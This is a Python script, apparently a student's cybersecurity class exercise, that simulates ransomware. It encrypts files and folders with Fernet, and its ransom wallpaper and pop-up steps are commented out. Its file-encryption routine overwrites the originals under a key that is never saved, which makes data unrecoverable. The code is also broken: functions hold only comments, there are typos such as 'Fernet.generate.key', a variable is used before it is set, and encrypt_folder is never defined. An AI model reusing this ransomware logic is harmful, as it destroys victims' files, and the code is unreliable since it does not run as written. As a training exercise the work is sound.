#!/usr/bin/env python3


# Script: Ops 401 Class 08 Ops challenge
# Author: Andrew P.
# Date of lastest revision: 05/02/2023
# Purpose: Encrypting and decrypting a file with python.
# Thanks to classmate Alex, instructor Alex for his demo and the introduction 
# to python help tools and practice sites, and chat.gpt to help me fix any 
# I messed up.



#     ------ START ------

from cryptography.fernet import Fernet
import os, math, time, datetime, getpass, os.path
import urllib.request
import ctypes
import pyautogui
from appscript import app, mactypes
import shutil


# Requirements
# Alter the desktop wallpaper on a Windows PC with a ransomware message
# Create a popup window on a Windows PC with a ransomware message

# Method 1: change_desktop_background
def change_desktop_background():
  # Need an imageURl
    # imageUrl = 'https://www.wweek.com/resizer/86tt-U3ytIrtb7bBYXAIg7XWz7A=/1200x0/filters:quality(100)/s3.amazonaws.com/arc-wordpress-client-uploads/wweek/wp-content/uploads/2019/08/30145212/Nicolas-Cage.jpg'
  # Need a path to save Image too
  # Tool: urllib request the image url and saves it to the path
    # urllib.request.urlretrieve(imageUrl, path)
  
  # ----- WINDOWS OS -----
    # Access windows dlls for funcionality eg, changing dekstop wallpaper
    # Tool: ctypes => allow us to change the background
    # Need to set SPI_SETDESKWALLPAPER = 20 so access Desktop functionality
      # ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

  # ----- Linux OS -----
  # Using the os package to access the gnome shell and passing it a file. This will change the desktop
    # os.system("gsettings set org.gnome.desktop.background picture-uri file:/home/user/Pictures/wallpapers/picture_name")

  # ----- MAC OS -----
  # need to install `appscript` through python
    # python3 -m pip install appscript
  # pathToImg = '/Users/InstructorWhtie/Desktop/caged.avif'
  # app('Finder').desktop_picture.set(mactypes.File(pathToImg))




# Method 2: pop_up
def pop_up():
  # pyautogiu => sends alerts! All OS's can use this, installed through python
    # pyautogui.alert("YO- you been 'Caged'!", "RANSOMWARE ALERT!!!!", button='WHAT!?!')


# Method 3: ransomeware
def ransomeware():
  # Encrypt directory contents()
  # change_desktop_background()
  # time.sleep(10)
  # pop_up()


# Method 4: ransomeware_restore
def ransomeware_restore():
  #   # Decrypt the dir contents()
  #   # restore background()

# Method 5: restore background
def restore_background():
  # Utilize the backgorund tool depending on your OS to provide it a default/original background

# NEED USER INPUT!
# what mode? 7=>ransomeware, 8=> restore
# provide a dir to ransome or set a default directory

    

# Define key
def write_key():

    key = Fernet.generate.key()
    with open("key.key", "wb") as key_file:
     key.file.write(key)
     
key = Fernet.generate_key()

# Fernet def
fernet = Fernet(key)

# Encryption
def encrypt_file(key, filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    os.remove(filepath)
    with open(filepath, 'wb') as f:
        f.write(encrypted)

def encrypt_string(key, plaintext):
    fernet = Fernet(key)
    encrypted = fernet.encrypt(plaintext.encode())
    print(encrypted.decode())

# Decryption
def decrypt_file(key, filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)
    os.remove(filepath)
    with open(filepath, 'wb') as f:
        f.write(decrypted)


def decrypt_string(key, ciphertext):
    fernet = Fernet(key)
    decrypted = fernet.decrypt(ciphertext.encode())
    print(decrypted.decode())


# Encrypt the message
encrypted_message = fernet.encrypt(message.encode())
message ="The Princess is in another castle."

# Write the encrypted message to a file
with open("encrypted_message.txt", "wb") as f:
    f.write(encrypted_message)

# Read the encrypted message from the file
with open("encrypted_message.txt", "rb") as f:
    encrypted_message = f.read()

# Decrypt the message
decrypted_message = fernet.decrypt(encrypted_message)

## main Part


def main():
    print("Select a mode:")
    print("1. Encrypt a file")
    print("2. Decrypt a file")
    print("3. Encrypt a message")
    print("4. Decrypt a message")

    mode = int(input("Enter mode: "))
    key = Fernet.generate_key()

    if mode == 1:
        filepath = input("Enter filepath: ")
        encrypt_file(key, filepath)
    elif mode == 2:
        filepath = input("Enter filepath: ")
        decrypt_file(key, filepath)
    elif mode == 3:
        plaintext = input("Enter plaintext: ")
        encrypt_string(key, plaintext)
    elif mode == 4:
        ciphertext = input("Enter ciphertext: ")
        decrypt_string(key, ciphertext)
    else:
        print("Invalid mode selected.")

if __name__ == "__main__":
    main()



# Folder walkthrough for recursive
for root, dirs, files in os.walk(folder_path):
    for file in files:
        file_path = os.path.join(root, file)
    

    # Read the file
    with open(file_path, "rb") as f:
        file_contents = f.read()
        
    #encrypt file
    encrypted_contents = fernet.encrypt(file_contents)



# Decrypt folders and files
def decrypt_folder(folder_path, key):
    # Create a Fernet instance with the key
    fernet = Fernet(key)

    # Walk through the folder tree recursively
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)

            # Read the contents of the file
            with open(file_path, "rb") as f:
                file_contents = f.read()

            # Decrypt the file contents
            decrypted_contents = fernet.decrypt(file_contents)

            # Write the decrypted contents back to the file
            with open(file_path, "wb") as f:
                f.write(decrypted_contents)



if __name__ == "__main__":
    # Generate a key
    key = Fernet.generate_key()

    # Encrypt a folder and its contents
    encrypt_folder("/path/to/folder", key)

    # Decrypt the encrypted folder and its contents
    decrypt_folder("/path/to/folder", key)



















